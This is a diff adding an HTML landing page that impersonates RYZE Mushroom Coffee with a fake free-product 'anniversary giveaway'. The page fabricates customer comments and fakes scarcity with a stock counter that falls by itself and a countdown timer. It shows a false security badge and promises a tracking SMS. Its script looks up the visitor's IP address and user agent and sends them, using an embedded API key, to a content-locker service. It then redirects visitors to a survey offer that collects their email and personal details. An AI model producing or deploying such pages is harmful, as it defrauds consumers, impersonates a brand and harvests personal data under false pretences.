@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RYZE | Anniversary Exclusive</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #030303;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --gold: linear-gradient(135deg, #f5d27a 0%, #b8860b 50%, #8a6508 100%);
+            --gold-light: #f5d27a;
+            --white: #ffffff;
+            --text-gray: #a1a1a1;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        html, body { 
+            margin: 0; 
+            padding: 0;
+            width: 100%;
+        }
+
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background: var(--bg); 
+            color: var(--white); 
+            overflow-x: hidden; 
+            line-height: 1.5;
+        }
+
+        .bg-glow { 
+            position: fixed; top: 0; left: 50%; transform: translateX(-50%); 
+            width: 100vw; height: 100vh; 
+            background: radial-gradient(circle at 50% -10%, rgba(184, 134, 11, 0.18) 0%, rgba(0, 0, 0, 0) 60%); 
+            z-index: -1; 
+        }
+
+        .page-wrapper { 
+            display: flex; flex-direction: column; align-items: center; 
+            padding: 10px 18px 40px; width: 100%; max-width: 500px; margin: 0 auto;
+            position: relative;
+        }
+        
+        .header-logo { margin-bottom: 12px; margin-top: 5px; }
+        .header-logo img { width: 105px; height: auto; }
+
+        .anniversary-full-card { 
+            background: rgba(184, 134, 11, 0.05); 
+            border: 1px solid rgba(184, 134, 11, 0.4); 
+            border-radius: 20px; padding: 18px; text-align: center; 
+            width: 100%; margin: 0 0 15px 0; backdrop-filter: blur(10px); 
+        }
+        
+        .main-text { font-size: 16px; font-weight: 600; color: #f5f5f5; line-height: 1.6; }
+        .highlight { color: var(--gold-light); font-weight: 800; text-transform: uppercase; }
+        
+        .main-card { 
+            width: 100%; background: var(--card-bg); 
+            backdrop-filter: blur(50px); border: 1px solid rgba(255, 255, 255, 0.08); 
+            border-radius: 40px; padding: 55px 22px 25px; margin-top: 85px; 
+            position: relative; box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        }
+
+        .product-container { position: relative; width: 200px; margin: -150px auto 20px; z-index: 100; }
+        .product-info-overlay {
+            position: absolute; bottom: 15px; left: -30px; background: rgba(184, 134, 11, 0.98);
+            color: #000; padding: 8px 12px; border-radius: 12px; font-size: 11px;
+            font-weight: 900; text-transform: uppercase; z-index: 102; 
+            transform: rotate(-5deg); border: 1px solid rgba(255,255,255,0.4);
+            animation: float-info 3s infinite alternate ease-in-out;
+        }
+        @keyframes float-info { 0% { transform: rotate(-5deg) translateY(0); } 100% { transform: rotate(-5deg) translateY(-8px); } }
+        .product-display img { width: 100%; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.6)); position: relative; z-index: 101; }
+
+        .stock-labels { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .stock-label-left { color: var(--text-gray); font-size: 12px; font-weight: 800; }
+        .stock-warning { color: #ff4757; font-weight: 900; font-size: 17px; }
+        
+        .stock-bar { height: 6px; background: rgba(255, 255, 255, 0.06); border-radius: 12px; overflow: hidden; margin-bottom: 25px; }
+        .stock-fill { height: 100%; background: #ff4757; width: 100%; border-radius: 12px; transition: width 0.5s ease; }
+
+        .info-box { background: rgba(255, 255, 255, 0.04); padding: 18px; border-radius: 20px; margin-bottom: 25px; border: 1px solid rgba(245, 210, 122, 0.15); }
+        .info-box ul { list-style:none; padding:0; margin:0; }
+        .info-box li { margin-bottom:12px; font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 10px; color: #f1f1f1; }
+
+        .security-badge {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            margin-top: 15px; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.08);
+            font-size: 12px; color: #2ecc71; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .start-btn { 
+            width: 100%; padding: 22px; border: none; border-radius: 22px; 
+            font-size: 19px; font-weight: 900; color: #000; background: var(--gold); 
+            cursor: pointer; text-transform: uppercase; position: relative; overflow: hidden;
+            box-shadow: 0 10px 25px rgba(184, 134, 11, 0.4); transition: transform 0.2s;
+        }
+        .start-btn:active { transform: scale(0.97); }
+
+        .timer-display { font-family: 'Orbitron', sans-serif; font-size: 28px; color: #ff4757; text-align: center; margin-top: 10px; letter-spacing: 3px; font-weight: 700; }
+
+        /* Realistic Comments Section */
+        .social-proof-section {
+            width: 100%; margin-top: 30px; background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; padding: 25px 20px;
+        }
+        .proof-title { font-size: 15px; font-weight: 800; margin-bottom: 15px; color: var(--gold-light); }
+        .comment-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 16px; margin-bottom: 12px; }
+        .comment-header { display: flex; justify-content: space-between; font-size: 12px; font-weight: 800; margin-bottom: 6px; }
+        .comment-username { color: var(--gold-light); font-weight: 800; }
+        .comment-time { color: #aaa; font-weight: 600; }
+        .comment-text { font-size: 14px; color: #ffffff; font-weight: 700; line-height: 1.5; }
+
+        .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.99); backdrop-filter: blur(30px); z-index:99999; align-items:center; justify-content:center; padding: 20px; }
+        .locker { background: #0a0a0a; border: 1px solid rgba(245, 210, 122, 0.25); border-radius: 35px; padding: 45px 25px; width: 100%; max-width: 400px; text-align: center; }
+        .step-item { display: flex; gap: 12px; margin-bottom: 15px; background: rgba(255,255,255,0.03); padding: 18px; border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); text-align: left; }
+        .step-number { background: var(--gold); color: #000; width: 28px; height: 28px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; font-size: 14px; }
+        .step-text { color: #fff; font-size: 14px; font-weight: 700; line-height: 1.5; }
+    </style>
+</head>
+<body onload="initPage()">
+    
+    <div class="bg-glow"></div>
+
+    <div class="page-wrapper" id="main-content">
+        <div class="header-logo">
+            <img src="https://i.postimg.cc/XqrBgQs2/telechargement-(4).png">
+        </div>
+
+        <div class="anniversary-full-card">
+            <div class="main-text">"Celebrating a decade of <span class="highlight">RYZE.</span> As a thank you, we are offering our latest product absolutely FREE. Don’t miss our most exclusive giveaway yet!</div>
+        </div>
+
+        <div class="main-card">
+            <div class="product-container">
+                <div class="product-info-overlay">
+                    🚀 NEW RELEASE<br>
+                    <span style="font-size: 8px; opacity: 0.8;">LIMITED EDITION BUNDLE</span>
+                </div>
+                <div class="product-display">
+                    <img src="https://i.ibb.co/bjgwP3VM/Creamer-ryze-n-shine-bundle-coffee-creamer-1-1.png">
+                </div>
+            </div>
+            
+            <div class="stock-labels"><span class="stock-label-left">REMAINING STOCK</span><span class="stock-warning">Only <span id="stock-count">30</span> left!</span></div>
+            <div class="stock-bar"><div class="stock-fill" id="stock-bar-fill"></div></div>
+
+            <div class="info-box">
+                <ul>
+                    <li><span style="color:var(--gold-light); font-size: 16px;">✔</span> Free Entry 100%</li>
+                    <li><span style="color:var(--gold-light); font-size: 16px;">✔</span> No Purchase Necessary</li>
+                    <li><span style="color:var(--gold-light); font-size: 16px;">✔</span> No Credit Card Required</li>
+                </ul>
+                <div class="security-badge">
+                    🔒 SSL 256-Bit Secure & Verified
+                </div>
+            </div>
+            
+            <button class="start-btn" onclick="start()">UNLOCK MY GIFT & CLAIM NOW</button>
+            
+            <div style="text-align:center; margin-top:25px; font-size:12px; font-weight:800; color:var(--text-gray); letter-spacing: 2px; text-transform: uppercase;">⚡ Flash Offer Expires In:</div>
+            <div class="timer-display" id="h24-timer">10:00</div>
+        </div>
+
+        <!-- Realistic Comments Section -->
+        <div class="social-proof-section">
+            <div class="proof-title">Recent Community Feedback</div>
+            
+            <div class="comment-card">
+                <div class="comment-header">
+                    <span class="comment-username">Mark T.</span>
+                    <span class="comment-time">2 mins ago</span>
+                </div>
+                <div class="comment-text">took like 3 minutes to finish the steps, got the text message confirmation. thanks.</div>
+            </div>
+
+            <div class="comment-card">
+                <div class="comment-header">
+                    <span class="comment-username">Jessica W.</span>
+                    <span class="comment-time">6 mins ago</span>
+                </div>
+                <div class="comment-text">was worried it needed a card at first but it's legit free entry.</div>
+            </div>
+
+            <div class="comment-card">
+                <div class="comment-header">
+                    <span class="comment-username">Daniel K.</span>
+                    <span class="comment-time">12 mins ago</span>
+                </div>
+                <div class="comment-text">hope it arrives soon, tracking code works fine.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="overlay" id="locker">
+        <div class="locker">
+            <div style="background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 26px; margin-bottom: 15px; text-transform: uppercase;">RYZE Mushroom Coffee</div>
+            <div style="font-weight: 800; font-size: 18px; color:#2ecc71; margin-bottom: 20px;">INFORMATION REQUIRED 👇:</div>
+            <div id="verification-content">
+                <div class="step-item"><div class="step-number">1</div><div class="step-text">Complete the short survey</div></div>
+                <div class="step-item"><div class="step-number">2</div><div class="step-text">Enter your info (Email or Details) to verify your entry.</div></div>
+                <div class="step-item"><div class="step-number">3</div><div class="step-text">After completing the steps, you will immediately receive an SMS text message containing your Shipping Tracking Number.</div></div>
+            </div>
+            <button class="start-btn" style="margin-top:15px;" id="offer-btn">START</button>
+        </div>
+    </div>
+
+    <script>
+        const API_KEY = "47297|JlMasv1g3z8O9xMh8iQslMuNUqi6CWeZPlNbFxpo3a51176c";
+        let resolvedOfferLink = "";
+
+        function initPage() {
+            fetchOffer();
+        }
+
+        function start() {
+            document.getElementById('main-content').style.opacity = '0.05';
+            document.getElementById('locker').style.display = 'flex';
+        }
+
+        async function fetchOffer() {
+            try {
+                let ip = "";
+                try {
+                    const cfRes = await fetch('https://cloudflare.com/cdn-cgi/trace');
+                    const cfText = await cfRes.text();
+                    ip = cfText.match(/ip=(.*)/)[1].trim();
+                } catch(err) {
+                    const ipRes = await fetch('https://api64.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                }
+
+                const apiUrl = `https://lockerpreview.com/api/v2?ip=${ip}&user_agent=${encodeURIComponent(navigator.userAgent)}`;
+                const offerRes = await fetch(apiUrl, {
+                    headers: { 'Authorization': `Bearer ${API_KEY}` }
+                });
+                const data = await offerRes.json();
+                
+                if(data.offers && data.offers.length > 0) {
+                    resolvedOfferLink = data.offers[0].link;
+                }
+            } catch(e) {
+                console.log("Error fetching offer:", e);
+            }
+
+            document.getElementById('offer-btn').onclick = () => {
+                if(resolvedOfferLink) {
+                    window.location.href = resolvedOfferLink;
+                } else {
+                    window.location.href = "https://lockerpreview.com/cl/i/47297";
+                }
+            };
+        }
+
+        // Timer 10:00 countdown
+        let seconds = 600; 
+        setInterval(() => {
+            let m = Math.floor(seconds / 60); 
+            let s = seconds % 60;
+            document.getElementById('h24-timer').innerText = (m<10?"0":"")+m+":"+(s<10?"0":"")+s;
+            if(seconds > 0) seconds--;
+        }, 1000);
+
+        // Stock Dynamic Scarcity (kaybda b 30 w yna9is 1 kola 5 saniwat 7tta ystaqrr f 3)
+        let stock = 30;
+        setInterval(() => {
+            if(stock > 3) {
+                stock -= 1;
+                document.getElementById('stock-count').innerText = stock;
+                document.getElementById('stock-bar-fill').style.width = (stock * 3.33) + "%";
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
